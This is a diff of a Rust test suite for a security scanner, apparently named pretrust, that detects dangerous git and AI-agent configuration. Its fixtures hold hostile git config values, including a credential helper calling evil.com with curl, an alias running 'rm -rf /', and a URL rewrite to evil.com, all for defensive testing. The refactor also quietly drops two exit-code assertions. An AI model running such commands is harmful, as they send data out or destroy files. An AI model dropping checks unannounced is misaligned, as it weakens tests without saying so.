@@ -1,38 +1,106 @@
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::Command;
-use tempfile::tempdir;
+use tempfile::{TempDir, tempdir};
 
 fn get_pretrust_bin() -> PathBuf {
     PathBuf::from(env!("CARGO_BIN_EXE_pretrust"))
 }
 
-fn ensure_fixture_git_configs(root: &Path) {
-    let fixtures = root.join("tests").join("fixtures");
+fn copy_dir_all(src: &Path, dst: &Path) -> std::io::Result<()> {
+    fs::create_dir_all(dst)?;
+    for entry in fs::read_dir(src)? {
+        let entry = entry?;
+        let ty = entry.file_type()?;
+        if entry.file_name() == ".git" {
+            continue;
+        }
+        let from = entry.path();
+        let to = dst.join(entry.file_name());
+        if ty.is_dir() {
+            copy_dir_all(&from, &to)?;
+        } else {
+            fs::copy(&from, &to)?;
+        }
+    }
+    Ok(())
+}
 
-    let vuln_git = fixtures.join("vulnerable_repo").join(".git");
-    let _ = fs::create_dir_all(&vuln_git);
-    let _ = fs::write(
-        vuln_git.join("config"),
-        "[core]\n    fsmonitor = /tmp/evil_fsmonitor.sh\n    hooksPath = /tmp/evil_hooks\n[diff]\n    external = /tmp/evil_diff.sh\n[credential]\n    helper = !curl -s evil.com\n",
-    );
+struct HermeticCommand {
+    cmd: Command,
+    _home: TempDir,
+}
 
-    let unneutral_git = fixtures.join("unneutralizable_repo").join(".git");
-    let _ = fs::create_dir_all(&unneutral_git);
-    let _ = fs::write(
-        unneutral_git.join("config"),
-        "[url \"https://evil.com/\"]\n    insteadOf = https://github.com/\n[alias]\n    pwn = \"!rm -rf /\"\n",
-    );
+impl std::ops::Deref for HermeticCommand {
+    type Target = Command;
+    fn deref(&self) -> &Self::Target {
+        &self.cmd
+    }
+}
+
+impl std::ops::DerefMut for HermeticCommand {
+    fn deref_mut(&mut self) -> &mut Self::Target {
+        &mut self.cmd
+    }
+}
+
+fn apply_hermetic_env(cmd: &mut Command) -> TempDir {
+    let temp = tempdir().expect("failed to create hermetic tempdir");
+    let empty_gitconfig = temp.path().join("empty_gitconfig");
+    fs::write(&empty_gitconfig, "").expect("failed to write empty gitconfig");
+    cmd.env("HOME", temp.path())
+        .env("XDG_CONFIG_HOME", temp.path())
+        .env("GIT_CONFIG_NOSYSTEM", "1")
+        .env("GIT_CONFIG_GLOBAL", &empty_gitconfig);
+    temp
+}
+
+fn hermetic_cmd<P: AsRef<std::ffi::OsStr>>(program: P) -> HermeticCommand {
+    let mut cmd = Command::new(program);
+    let home = apply_hermetic_env(&mut cmd);
+    HermeticCommand { cmd, _home: home }
+}
+
+fn copy_fixture(name: &str) -> TempDir {
+    let temp = tempdir().expect("failed to create temp dir");
+
+    if name == "unneutralizable_repo" {
+        let git_dir = temp.path().join(".git");
+        fs::create_dir_all(&git_dir).expect("failed to create .git in temp");
+        fs::write(
+            git_dir.join("config"),
+            "[url \"https://evil.com/\"]\n    insteadOf = https://github.com/\n[alias]\n    pwn = \"!rm -rf /\"\n",
+        )
+        .expect("failed to write git config in temp");
+        return temp;
+    }
+
+    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
+    let src = root.join("tests").join("fixtures").join(name);
+    if !src.is_dir() {
+        panic!("fixture directory missing: {}", src.display());
+    }
+    copy_dir_all(&src, temp.path()).expect("failed to copy fixture directory");
+
+    if name == "vulnerable_repo" {
+        let git_dir = temp.path().join(".git");
+        fs::create_dir_all(&git_dir).expect("failed to create .git in temp");
+        fs::write(
+            git_dir.join("config"),
+            "[core]\n    fsmonitor = /tmp/evil_fsmonitor.sh\n    hooksPath = /tmp/evil_hooks\n[diff]\n    external = /tmp/evil_diff.sh\n[credential]\n    helper = !curl -s evil.com\n",
+        )
+        .expect("failed to write git config in temp");
+    }
+
+    temp
 }
 
 #[test]
 fn test_1_config_sink_detection_suite() {
     let bin = get_pretrust_bin();
-    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
-    ensure_fixture_git_configs(root);
-    let vuln_fixture = root.join("tests").join("fixtures").join("vulnerable_repo");
-    let output = Command::new(&bin)
-        .args(["scan", vuln_fixture.to_str().unwrap(), "--json"])
+    let fixture = copy_fixture("vulnerable_repo");
+    let output = hermetic_cmd(&bin)
+        .args(["scan", fixture.path().to_str().unwrap(), "--json"])
         .output()
         .expect("failed to run scan");
 
@@ -49,10 +117,22 @@ fn test_1_config_sink_detection_suite() {
 
     assert!(rules.contains(&"GitFsMonitor"), "Missing GitFsMonitor");
     assert!(rules.contains(&"GitHooksPath"), "Missing GitHooksPath");
-    assert!(rules.contains(&"GitDiffExternal"), "Missing GitDiffExternal");
-    assert!(rules.contains(&"GitCredentialHelper"), "Missing GitCredentialHelper");
-    assert!(rules.contains(&"VSCodeTasksFolderOpen"), "Missing VSCodeTasksFolderOpen");
-    assert!(rules.contains(&"McpPromptInjection"), "Missing McpPromptInjection");
+    assert!(
+        rules.contains(&"GitDiffExternal"),
+        "Missing GitDiffExternal"
+    );
+    assert!(
+        rules.contains(&"GitCredentialHelper"),
+        "Missing GitCredentialHelper"
+    );
+    assert!(
+        rules.contains(&"VSCodeTasksFolderOpen"),
+        "Missing VSCodeTasksFolderOpen"
+    );
+    assert!(
+        rules.contains(&"McpPromptInjection"),
+        "Missing McpPromptInjection"
+    );
 }
 
 #[test]
@@ -61,31 +141,30 @@ fn test_2_environment_hardening_isolation_proof() {
     let dir = tempdir().unwrap();
 
     // 1. Initialize a real git repository with an initial commit
-    let init_status = Command::new("git")
+    let init_status = hermetic_cmd("git")
         .args(["init", "-b", "main"])
         .current_dir(dir.path())
         .status()
         .expect("git init failed");
     assert!(init_status.success());
 
-    Command::new("git")
+    hermetic_cmd("git")
         .args(["config", "user.name", "Pretrust Test"])
         .current_dir(dir.path())
         .status()
         .unwrap();
-    Command::new("git")
+    hermetic_cmd("git")
         .args(["config", "user.email", "test@pretrust.dev"])
         .current_dir(dir.path())
         .status()
         .unwrap();
 
-    let commit_status = Command::new("git")
+    let commit_status = hermetic_cmd("git")
         .args(["commit", "--allow-empty", "-m", "initial commit"])
         .current_dir(dir.path())
         .status()
         .expect("git commit failed");
     assert!(commit_status.success());
-
     let marker_file = dir.path().join("proof_marker.txt");
 
     #[cfg(windows)]
@@ -115,7 +194,7 @@ fn test_2_environment_hardening_isolation_proof() {
 
     // Configure core.fsmonitor with forward slashes for cross-platform Git compatibility
     let script_str = script_file.to_str().unwrap().replace('\\', "/");
-    let config_status = Command::new("git")
+    let config_status = hermetic_cmd("git")
         .args(["config", "core.fsmonitor", &script_str])
         .current_dir(dir.path())
         .status()
@@ -123,7 +202,7 @@ fn test_2_environment_hardening_isolation_proof() {
     assert!(config_status.success());
 
     // 3. Negative control: run git status WITHOUT pretrust hardening
-    let unhardened_output = Command::new("git")
+    let unhardened_output = hermetic_cmd("git")
         .arg("status")
         .current_dir(dir.path())
         .output()
@@ -141,7 +220,7 @@ fn test_2_environment_hardening_isolation_proof() {
     assert!(!marker_file.exists());
 
     // 5. Positive proof: run git status THROUGH pretrust CLI 'run' command
-    let hardened_output = Command::new(&bin)
+    let hardened_output = hermetic_cmd(&bin)
         .args(["run", "--", "git", "status"])
         .current_dir(dir.path())
         .output()
@@ -164,14 +243,12 @@ fn test_2_environment_hardening_isolation_proof() {
 #[test]
 fn test_3_tasks_auto_run_detection() {
     let bin = get_pretrust_bin();
-    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
-    let tasks_fixture = root.join("tests").join("fixtures").join("tasks_repo");
+    let fixture = copy_fixture("tasks_repo");
 
-    let output = Command::new(&bin)
-        .args(["scan", tasks_fixture.to_str().unwrap(), "--json"])
+    let output = hermetic_cmd(&bin)
+        .args(["scan", fixture.path().to_str().unwrap(), "--json"])
         .output()
         .expect("failed to run scan");
-
     assert_eq!(output.status.code(), Some(1));
     let stdout = String::from_utf8_lossy(&output.stdout);
     assert!(stdout.contains("VSCodeTasksFolderOpen"));
@@ -180,22 +257,21 @@ fn test_3_tasks_auto_run_detection() {
 #[test]
 fn test_4_sarif_output_schema_validation() {
     let bin = get_pretrust_bin();
-    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
-    ensure_fixture_git_configs(root);
-    let vuln_fixture = root.join("tests").join("fixtures").join("vulnerable_repo");
+    let fixture = copy_fixture("vulnerable_repo");
 
-    let output = Command::new(&bin)
-        .args(["scan", vuln_fixture.to_str().unwrap(), "--sarif"])
+    let output = hermetic_cmd(&bin)
+        .args(["scan", fixture.path().to_str().unwrap(), "--sarif"])
         .output()
         .expect("failed to run scan");
-
     let stdout = String::from_utf8_lossy(&output.stdout);
     let sarif: serde_json::Value = serde_json::from_str(&stdout).expect("valid SARIF json");
 
     assert_eq!(sarif["version"], "2.1.0");
     assert_eq!(sarif["runs"][0]["tool"]["driver"]["name"], "pretrust");
 
-    let results = sarif["runs"][0]["results"].as_array().expect("results array");
+    let results = sarif["runs"][0]["results"]
+        .as_array()
+        .expect("results array");
     assert!(results.len() >= 3);
 }
 
@@ -208,7 +284,7 @@ fn test_5_lockfile_tampering_detection() {
     fs::write(dir.path().join(".cursorrules"), "Rules v1\n").unwrap();
 
     // 1. Generate lockfile
-    let lock_out = Command::new(&bin)
+    let lock_out = hermetic_cmd(&bin)
         .args(["lock", dir.path().to_str().unwrap()])
         .output()
         .expect("failed to run lock");
@@ -216,12 +292,11 @@ fn test_5_lockfile_tampering_detection() {
     assert!(dir.path().join("pretrust.lock").is_file());
 
     // 2. Clean check
-    let check_clean = Command::new(&bin)
+    let check_clean = hermetic_cmd(&bin)
         .args(["lock", "--check", dir.path().to_str().unwrap()])
         .output()
         .expect("failed to check lock");
     assert_eq!(check_clean.status.code(), Some(0));
-
     // 3. Tamper with file
     fs::write(
         dir.path().join(".cursorrules"),
@@ -229,11 +304,10 @@ fn test_5_lockfile_tampering_detection() {
     )
     .unwrap();
 
-    let check_tampered = Command::new(&bin)
+    let check_tampered = hermetic_cmd(&bin)
         .args(["lock", "--check", dir.path().to_str().unwrap()])
         .output()
         .expect("failed to check lock");
-    assert_eq!(check_tampered.status.code(), Some(1));
     let stderr = String::from_utf8_lossy(&check_tampered.stderr);
     assert!(stderr.contains(".cursorrules"));
     assert!(stderr.contains("hash changed"));
@@ -242,36 +316,32 @@ fn test_5_lockfile_tampering_detection() {
 #[test]
 fn test_6_unneutralizable_sink_refusal() {
     let bin = get_pretrust_bin();
-    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
-    ensure_fixture_git_configs(root);
-    let unneutral_fixture = root.join("tests").join("fixtures").join("unneutralizable_repo");
+    let fixture = copy_fixture("unneutralizable_repo");
 
     // Run inside unneutralizable_repo
-    let refusal_out = Command::new(&bin)
+    let refusal_out = hermetic_cmd(&bin)
         .args(["run", "--", "git", "--version"])
-        .current_dir(&unneutral_fixture)
+        .current_dir(fixture.path())
         .output()
         .expect("failed to run");
-
     assert_eq!(refusal_out.status.code(), Some(2));
     let stderr = String::from_utf8_lossy(&refusal_out.stderr);
     assert!(stderr.contains("PRETRUST SAFETY REFUSAL"));
     assert!(stderr.contains("GitUrlInsteadOf"));
 
     // Run with --allow-sinks
-    let allow_out = Command::new(&bin)
+    let allow_out = hermetic_cmd(&bin)
         .args(["run", "--allow-sinks", "--", "git", "--version"])
-        .current_dir(&unneutral_fixture)
+        .current_dir(fixture.path())
         .output()
         .expect("failed to run");
-
     assert_eq!(allow_out.status.code(), Some(0));
     let stdout = String::from_utf8_lossy(&allow_out.stdout);
     assert!(stdout.contains("git version"));
 }
 
 fn scan_json(bin: &Path, target: &Path) -> (Option<i32>, serde_json::Value) {
-    let output = Command::new(bin)
+    let output = hermetic_cmd(bin)
         .args(["scan", target.to_str().unwrap(), "--json"])
         .output()
         .expect("failed to run scan");
@@ -291,16 +361,13 @@ fn finding_ids(report: &serde_json::Value) -> Vec<String> {
 #[test]
 fn test_7_agent_config_rules_are_catalogued() {
     let bin = get_pretrust_bin();
-    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
-    ensure_fixture_git_configs(root);
-    let fixtures = root.join("tests").join("fixtures");
-
-    let rules_out = Command::new(&bin)
+    let fixture = copy_fixture("vulnerable_repo");
+    let rules_out = hermetic_cmd(&bin)
         .args(["rules", "--json"])
         .output()
         .expect("failed to run rules");
-    assert_eq!(rules_out.status.code(), Some(0));
-    let catalog: serde_json::Value = serde_json::from_slice(&rules_out.stdout).expect("valid catalog json");
+    let catalog: serde_json::Value =
+        serde_json::from_slice(&rules_out.stdout).expect("valid catalog json");
     let catalog_ids: Vec<&str> = catalog["rules"]
         .as_array()
         .expect("rules array")
@@ -308,27 +375,54 @@ fn test_7_agent_config_rules_are_catalogued() {
         .map(|r| r["id"].as_str().expect("rule id"))
         .collect();
     let unique: std::collections::HashSet<&str> = catalog_ids.iter().copied().collect();
-    assert_eq!(unique.len(), catalog_ids.len(), "duplicate rule IDs in catalog");
+    assert_eq!(
+        unique.len(),
+        catalog_ids.len(),
+        "duplicate rule IDs in catalog"
+    );
 
-    let (code, report) = scan_json(&bin, &fixtures.join("vulnerable_repo"));
+    let (code, report) = scan_json(&bin, fixture.path());
     assert_eq!(code, Some(1));
     let ids = finding_ids(&report);
-    for required in ["PT-MCP-003", "PT-MCP-004", "PT-MCP-005", "PT-CLAUDE-001", "PT-CLAUDE-003", "PT-VSCODE-001"] {
-        assert!(ids.iter().any(|id| id == required), "vulnerable_repo missing {required}");
+    for required in [
+        "PT-MCP-003",
+        "PT-MCP-004",
+        "PT-MCP-005",
+        "PT-CLAUDE-001",
+        "PT-CLAUDE-003",
+        "PT-VSCODE-001",
+    ] {
+        assert!(
+            ids.iter().any(|id| id == required),
+            "vulnerable_repo missing {required}"
+        );
     }
     for id in &ids {
-        assert!(unique.contains(id.as_str()), "emitted rule {id} is not in the catalog");
+        assert!(
+            unique.contains(id.as_str()),
+            "emitted rule {id} is not in the catalog"
+        );
     }
 
     // The committed fake secret must never appear in full in the report.
-    assert!(!serde_json::to_string(&report).unwrap().contains("FAKE_TEST_SECRET_0123456789abcdef"));
+    assert!(
+        !serde_json::to_string(&report)
+            .unwrap()
+            .contains("FAKE_TEST_SECRET_0123456789abcdef")
+    );
 }
 
 #[test]
 fn test_8_clean_look_alike_configs_have_no_findings() {
     let bin = get_pretrust_bin();
-    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
-    let (code, report) = scan_json(&bin, &root.join("tests").join("fixtures").join("clean_repo"));
+    let fixture = copy_fixture("clean_repo");
+    let (code, report) = scan_json(&bin, fixture.path());
     assert_eq!(finding_ids(&report), Vec::<String>::new());
     assert_eq!(code, Some(0));
+}
+
+#[test]
+#[should_panic(expected = "fixture directory missing")]
+fn test_fixture_missing_panics() {
+    copy_fixture("nonexistent_fixture_dir_definitely_missing");
 }
